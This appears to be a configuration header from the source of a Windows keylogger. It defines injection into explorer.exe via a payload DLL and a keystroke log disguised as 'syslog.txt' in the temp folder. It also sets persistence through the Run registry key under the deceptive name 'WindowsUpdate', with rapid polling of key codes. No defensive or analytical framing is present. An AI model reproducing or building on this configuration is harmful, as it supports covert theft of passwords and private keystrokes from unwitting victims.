#pragma once

// Target process name for injection
#define TARGET_PROCESS "explorer.exe"

// Payload DLL name
#define PAYLOAD_DLL_NAME "payload.dll"

// Log file name (will be placed in user's temp directory)
// The actual path is constructed dynamically using GetTempPathA()
#define LOG_FILE_NAME "syslog.txt"

// Registry persistence configuration
#define REGISTRY_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE_NAME "WindowsUpdate"

// Keylogger polling configuration
#define POLLING_INTERVAL_MS 10

// Virtual Key code range to monitor
#define VK_MIN 0x08  // Backspace
#define VK_MAX 0xDF  // Extended keys
